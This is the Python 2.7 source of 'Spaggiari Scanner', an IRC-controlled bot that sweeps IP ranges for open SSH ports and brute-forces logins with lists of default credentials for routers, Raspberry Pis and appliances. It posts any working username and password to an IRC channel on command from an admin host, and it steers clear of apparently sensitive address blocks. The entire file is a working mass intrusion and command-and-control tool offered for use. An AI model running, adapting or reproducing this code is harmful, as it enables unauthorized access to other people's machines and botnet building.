#!/usr/bin/env python
# Spaggiari Scanner - Version 1.0b
# A Secure Shell (SSH) scanner / bruteforcer controlled via the Internet Relay Chat (IRC) protocol.
# Developed by acidvegas in Python 2.7
# https://github.com/acidvegas/spaggiari/
# spaggiari.py

"""
'sans armes, ni haine, ni violence'

Requirments:
 - Python 2.7       (http://www.python.org/)
 - Paramiko Library (http://www.paramiko.org/)
 
Commands:
 - @help      | A list of commands, syntax, and descriptions.
 - @info      | Information about the server.
 - @kill      | Kill the bot.
 - @scan      | Scan every in IP address in the range arguments.
 - @status    | Check the scanning status on the bot.
 - @stop      | Stop all current running scans.
 - @version   | Information about the scanner.

Note: Commands require either 'all' or the bots unique id after it.
If the bot has a nick of 'spag-tnnxu', the id of that bot is 'tnnxu'.
You can issue a command with '@info all', or '@info tnnxu'.

Bugs:
- Using combos.keys() is in ABC order and not testing 'root' first.
- Long range ip scans may consume memory and crash.
- The @stop command is not perfect and doesn't fully stop scans in progress.
 
Todo:
- Create a more accurate and comprehensive spooky / dns list.
- Implement scanning for telnet and ftp.
- Make use of 'deep_combos' after no successful logins.
- Use pyinstaller to create a single executable.
- Give up after x amount of timeouts.
- Slow random scans when idle.
"""

import datetime
import getpass
import os
import platform
import random
import re
import socket
import ssl
import sys
import threading
import time
import urllib2

# IRC Config
server   = 'irc.server.com'
port     = 6697
use_ssl  = True
password = None
channel  = '#dev'
key      = None

# Other Config
admin_host   = 'admin.host'
control_char = '@'
throttle     = 20

# SSH Login Attempts
combos = {
    'root'      : ['root','toor','admin','changeme','pass','password','1234','12345','123456'],
    'admin'     : ['1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'],
    'cisco'     : 'cisco',
    'pi'        : 'raspberry',
}

deep_combos = {
    'root'      : ['alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0'],
    'admin'     : ['aerohive','kn1TG7psLu','TANDBERG'],
    'alien'     : 'alien',
    'bitnami'   : 'bitnami',
    'device'    : 'apc',
    'dpn'       : 'changeme',
    'HPSupport' : 'badg3r5',
    'lp'        : 'lp',
    'master'    : 'themaster01',
    'osmc'      : 'osmc',
    'plexuser'  : 'rasplex',
    'sysadmin'  : 'PASS',
    'toor'      : 'logapp',
    'ubnt'      : 'ubnt',
    'user'      : ['acme','live'],
    'vagrant'   : 'vagrant',
    'virl'      : 'VIRL',
    'vyos'      : 'vyos',
}

# Important Ranges
lucky  = ['113.53','117.156','118.173','118.174','122.168','122.176','165.229','177.11','182.74','186.113','186.114','186.115','186.119','187.109','188.59','190.252','190.253','190.254','190.255','190.65','190.66','190.67','190.68','190.69','201.75','31.176','60.51','84.122','95.169','95.6','95.9']
spooky = ['11','21','22','24','25','26','29','49','50','55','62','64','128','129','130','131','132','134','136','137','138','139','140','143','144','146','147','148','150','152','153','155','156','157','158','159','161','162','163','164','167','168','169','194','195','199','203','204','205','207','208','209','212','213','216','217','6','7']
dns    = ['10','100.64','100.65','100.66','100.67','100.68','100.69','100.70','100.71','100.72','100.73','100.74','100.75','100.76','100.77','100.78','100.79','100.80','100.81','100.82','100.83','100.84','100.85','100.86','100.87','100.88','100.89','100.90','100.91','100.92','100.93','100.94','100.95','100.96','100.97','100.98','100.99','100.100','100.101','100.102','100.103','100.104','100.105','100.106','100.107','100.108','100.109','100.110','100.111','100.112','100.113','100.114','100.115','100.116','100.117','100.118','100.119','100.120','100.121','100.122','100.123','100.124','100.125','100.126','100.127','127','169.254','172.16','172.17','172.18','172.19','172.20','172.21','172.22','172.23','172.24','172.25','172.26','172.27','172.28','172.29','172.30','172.31','192.0.0','192.0.2','192.88.99','192.168','198.18','198.19','198.51.100','203.0.113','224','225','226','227','228','229','230','231','232','233','234','235','236','237','238','239','240','241','242','243','244','245','246','247','248','249','250','251','252','253','254','255']

# Formatting Control Characters
bold        = '\x02'
colour      = '\x03'
italic      = '\x1D'
underline   = '\x1F'
reverse     = '\x16'
reset       = '\x0f'

# Color Codes
white       = '00'
black       = '01'
blue        = '02'
green       = '03'
red         = '04'
brown       = '05'
purple      = '06'
orange      = '07'
yellow      = '08'
light_green = '09'
cyan        = '10'
light_cyan  = '11'
light_blue  = '12'
pink        = '13'
grey        = '14'
light_grey  = '15'

# Debug Functions
def action(msg):
    print '%s | [#] - %s' % (get_time(), msg)

def alert(msg):
    print '%s | [+] - %s' % (get_time(), msg)

def check_ip(ip):
    return re.match('^(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])$', ip)

def check_root():
    if os.getuid() == 0 or os.geteuid() == 0:
        return True
    else:
        return False

def check_version(major, minor):
    if sys.version_info.major == major and sys.version_info.minor == minor:
        return True
    else:
        return False

def debug(msg):
    print '%s | [~] - %s' % (get_time(), msg)

def error(msg, reason=None):
    if reason:
        print '%s | [!] - %s (%s)' % (get_time(), msg, reason)
    else:
        print '%s | [!] - %s'      % (get_time(), msg)

def error_exit(msg):
    raise SystemExit('%s | [!] - %s' % (get_time(), msg))

def get_time():
    return datetime.datetime.now().strftime('%I:%M:%S')

def get_windows():
    if os.name == 'nt':
        return True
    else:
        return False

def keep_alive():
    try:
        while True : raw_input('')
    except KeyboardInterrupt:
        sys.exit()



# Information
def get_arch()     : return ' '.join(platform.architecture())
def get_dist()     : return ' '.join(platform.linux_distribution())
def get_home()     : return os.environ['HOME']
def get_hostname() : return socket.gethostname()

def get_ip():
    try    : return re.findall(r'[0-9]+(?:\.[0-9]+){3}', urllib2.urlopen('http://checkip.dyndns.com/').read())[0]
    except : return 'Unknown IP Address'

def get_kernel()   : return platform.release()
def get_username() : return getpass.getuser()



# Functions
def check_port(ip, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        code = sock.connect((ip, port))
        if not code  : return True
        else         : return False
    except socket.error:
        return False
    finally:
        sock.close()

def check_range(targets):
    breaker = False
    found   = False
    for ip in targets:
        if breaker : break
        for spooky_range in spooky:
            if ip.startswith(spooky_range + '.'):
                breaker = True
                found   = True
                break
        if breaker : break
        for dns_range in dns:
            if ip.startswith(dns_range + '.'):
                breaker = True
                found   = True
                break
    return found

def color(msg, foreground, background=None):
    if background : return '%s%s,%s%s%s' % (colour, foreground, background, msg, reset)
    else          : return '%s%s%s%s'    % (colour, foreground, msg, reset)

def ip_range(start_ip, end_ip):
    start = list(map(int, start_ip.split('.')))
    end   = list(map(int, end_ip.split('.')))
    temp  = start
    ip_range = []
    ip_range.append(start_ip)
    while temp != end:
        start[3] += 1
        for i in (3, 2, 1):
           if temp[i] == 256:
              temp[i] = 0
              temp[i-1] += 1
        ip_range.append('.'.join(map(str, temp)))
    random.shuffle(ip_range)
    return ip_range

def random_ip()          : return '%s.%s.%s.%s' % (random_int(0,255), random_int(0,255), random_int(0,255), random_int(0,255))
def random_int(min, max) : return random.randint(min, max)
def random_str(size)     : return ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for _ in range(size))

class scan(threading.Thread):
    def __init__(self, ip_range):
        self.ip_range = ip_range
        threading.Thread.__init__(self)
    def run(self):
        for ip in self.ip_range:
            if SpaggiariBot.stop_scan:
                break
            else:
                ssh_bruteforce(ip).start()
                while threading.activeCount() >= 100:
                    time.sleep(1)
            self.ip_range.remove(ip)
        while threading.activeCount() >= 3:
            time.sleep(1)
        SpaggiariBot.scanning = False

class ssh_bruteforce(threading.Thread):
    def __init__(self, host):
        self.host = host
        threading.Thread.__init__(self)
    def run(self):
        if check_port(self.host, 22):
            alert('%s has port 22 open.' % self.host)
            for user in combos.keys():
                if SpaggiariBot.stop_scan:
                    break
                password = combos[user]
                if type(password) == list:
                    for item in password:
                        ssh_connect(self.host, user, item)
                        time.sleep(throttle)
                else:
                    ssh_connect(self.host, user, password)
                    time.sleep(throttle)
        else:
            error('%s does not have port 22 open.' % self.host)

def ssh_connect(hostname, username, password):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname, 22, username, password, timeout=10.0)
        alert('Successful connection to %s using %s:%s' % (hostname, username, password))
        SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), hostname, username, password))
    except paramiko.ssh_exception.AuthenticationException:
        error('Failed to connect to %s using %s:%s (Authentication Error)' % (hostname, username, password))
        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'  % (hostname, username, password), 'Authentication Error')
    except paramiko.ssh_exception.BadHostKeyException:
        error('Failed to connect to %s using %s:%s (Bad Host Key Exception)' % (hostname, username, password))
        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s'    % (hostname, username, password), 'Bad Host Key Exception')
    except paramiko.ssh_exception.SSHException:
        error('Failed to connect to %s using %s:%s (SSH Exception)'       % (hostname, username, password))
        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), 'SSH Exception')
    except socket.timeout:
        error('Failed to connect to %s using %s:%s (Timeout)'             % (hostname, username, password, ex))
        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), 'Timeout')
    except socket.error as ex:
        error('Failed to connect to %s using %s:%s (%s)'                  % (hostname, username, password, ex))
        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), ex)
    except Exception as ex:
        error('Failed to connect to %s using %s:%s (%s)'                  % (hostname, username, password, ex))
        SpaggiariBot.error(channel, 'Failed to connect to %s using %s:%s' % (hostname, username, password), ex)
    finally:
        ssh.close()



# IRC Bot Object
class IRC(threading.Thread):
    def __init__(self, server, port, use_ssl, password, channel, key):
        self.server    = server
        self.port      = port
        self.use_ssl   = use_ssl
        self.password  = password
        self.channel   = channel
        self.key       = key
        self.nickname  = 'spag-xxxxx'
        self.id        = self.nickname[-5:]
        self.sock      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.scanning  = False
        self.stop_scan = False
        threading.Thread.__init__(self)

    def run(self):
        self.nickname = 'spag-' + random_str(5)
        if check_root() : self.nickname = 'r' + self.nickname
        self.connect()

    def action(self, chan, msg):
        self.sendmsg(chan, '\x01ACTION %s\x01' % msg)

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            if self.use_ssl: self.sock = ssl.wrap_socket(self.sock)
            self.sock.connect((self.server, self.port))
            if self.password : self.raw('PASS ' + self.password)
            self.raw('USER %s 0 * :%s' % (random_str(5), random_str(5)))
            self.nick(self.nickname)
            self.listen()
        except Exception as ex:
            error('Failed to connect to IRC server.', ex)
            self.event_disconnect()

    def disconnect(self):
        if self.sock != None:
            try    : self.sock.shutdown(socket.SHUT_RDWR)
            except : pass
            self.sock.close()
            self.sock = None

    def error(self, chan, msg, reason=None):
        if reason:
            self.sendmsg(chan, '[%s] - %s %s' % (color('-', red), msg, color('(' + str(reason) + ')', grey)))
        else:
            self.sendmsg(chan, '[%s] - %s' % (color('-', red), msg))

    def event_connect(self):
        self.mode(self.nickname, '+B')
        self.join(self.channel, self.key)
        
    def event_disconnect(self):
        self.disconnect()
        time.sleep(5)
        self.connect()

    def event_kick(self, nick, chan, kicked, reason):
        if kicked == self.nickname and chan == self.channel:
            self.join(chan, self.key)
            
    def event_message(self, nick, host, chan, msg):
        if (not nick.startswith('spag-') or not nick.startswith('rspag-')) and host == admin_host:
            args = msg.split()
            cmd  = args[0].replace(control_char, '', 1)
            if len(args) == 2:
                if cmd == 'help' and args[1] == self.id:
                    self.sendmsg(chan, color('@help',    yellow) + reset + ' - A list of commands and descriptions.')
                    self.sendmsg(chan, color('@info',    yellow) + reset + ' - Information about the server.')
                    self.sendmsg(chan, color('@kill',    yellow) + reset + ' - Kill the bot.')
                    self.sendmsg(chan, color('@scan',    yellow) + reset + ' - Scan every in IP address in the range arguments.')
                    self.sendmsg(chan, color('@status',  yellow) + reset + ' - Check the scanning status on the bot.')
                    self.sendmsg(chan, color('@stop',    yellow) + reset + ' - Stop all current running scans.')
                    self.sendmsg(chan, color('@version', yellow) + reset + ' - Information about the scanner.')
                if args[1] == 'all' or args[1] == self.id:
                    if cmd == 'info':
                        self.sendmsg(chan, '%s@%s (%s) | %s %s | %s' % (get_username(), get_hostname(), get_ip(), get_dist(), get_arch(), get_kernel()))
                    elif cmd == 'kill':
                        self.stop_scan = True
                        self.scanning = False
                        self.quit('KILLED')
                        sys.exit()
                    elif cmd == 'status':
                        if self.scanning:
                            self.sendmsg(chan, 'Scanning: ' + color('True', green))
                        else:
                            self.sendmsg(chan, 'Scanning: ' + color('False', red))
                    elif cmd == 'stop':
                        if self.scanning:
                            self.stop_scan = True
                            while threading.activeCount() >= 3:
                                time.sleep(1)
                            self.action(chan, 'Stopped all running scans.')
                            self.scanning = False
                    elif cmd == 'version':
                        self.sendmsg(chan, bold + 'Spaggiari Scanner - Version 1.0b - Developed by acidvegas in Python 2.7 - https://github.com/acidvegas/spaggiari/')    
            elif len(args) >= 3:
                if cmd == 'scan' and args[1] == self.id:
                    if not self.scanning:
                        if args[2] == 'a':
                            a_range = args[3]
                            start   = a_range + '.0.0.0'
                            end     = a_range + '.255.255.255'
                        elif args[2] == 'b':
                            b_range = args[3]
                            start   = b_range + '.0.0'
                            end     = b_range + '.255.255'
                        elif args[2] == 'c':
                            c_range = args[3]
                            start   = c_range + '.0'
                            end     = c_range + '.255'
                        elif args[2] == 'lucky':
                            lucky_range = random.choice(lucky)
                            start       = lucky_range + '.0.0'
                            end         = lucky_range + '.255.255'
                        else:
                            start = args[2]
                            end   = args[3]
                        if check_ip(start) and check_ip(end):
                            targets = ip_range(start, end)
                            if not check_range(targets):
                                self.sendmsg(chan, '[%s] - Scanning %s IP addresses in range...' % (color('#', blue), '{:,}'.format(len(targets))))
                                self.scanning = True
                                scan(targets).start()
                                self.sendmsg(chan, '[%s] - Scan has completed. %s' % (color('#', blue), color('(Threads still may be running.)', grey)))
                            else:
                                self.error(chan, 'Spooky IP address range.')
                        else:
                            self.error(chan, 'Invalid IP address range.')
                    else:
                        self.error(chan, 'A scan is already running.')

    def handle_events(self, data):
        args = data.split()
        if   args[0] == 'PING' : self.raw('PONG ' + args[1][1:])
        elif args[1] == '001'  : self.event_connect()
        elif args[1] == '433'  :
            self.id       = random_str(5)
            self.nickname = self.nickname[:-5] + self.id
            self.nick(self.nickname)
        elif args[1] in ['KICK', 'PRIVMSG']:
            name = args[0].split('!')[0][1:]
            if name != self.nickname:
                if args[1] == 'KICK':
                    chan   = args[2]
                    kicked = args[3]
                    self.event_kick(name, chan, kicked)
                elif args[1] == 'PRIVMSG':
                    host = args[0].split('!')[1].split('@')[1]
                    chan = args[2]
                    msg  = data.split(args[1] + ' ' + chan + ' :')[1]
                    if chan == self.channel:
                        self.event_message(name, host, chan, msg)

    def join(self, chan, key=None):
        if key : self.raw('JOIN %s %s' % (chan, key))
        else   : self.raw('JOIN ' + chan)

    def listen(self):
        while True:
            try:
                data = self.sock.recv(1024)
                for line in data.split('\r\n'):
                    if line:
                        debug(line)
                        if len(line.split()) >= 2:
                            self.handle_events(line)
                if 'Closing Link' in data and self.nickname in data : break
            except Exception as ex:
                error('Unexpected error occured.', ex)
                break
        self.event_disconnect()

    def mode(self, target, mode):
        self.raw('MODE %s %s' % (target, mode))

    def nick(self, nick):
        self.raw('NICK ' + nick)

    def quit(self, msg):
        self.raw('QUIT :' + msg)

    def raw(self, msg):
        self.sock.send(msg + '\r\n')

    def sendmsg(self, target, msg):
        self.raw('PRIVMSG %s :%s' % (target, msg))

# Main
if not check_version(2,7):
    error_exit('Spaggiari Scanner requires Python version 2.7 to run!')
if get_windows():
    error_exit('Spaggiari Scanner must be ran on a Linux based OS!')
try:
    import paramiko
except ImportError:
    error_exit('Failed to import the Paramiko library! (http://www.paramiko.org/)')
else:
    paramiko.util.log_to_file('/dev/null')
SpaggiariBot = IRC(server, port, use_ssl, password, channel, key)
SpaggiariBot.start()
keep_alive()
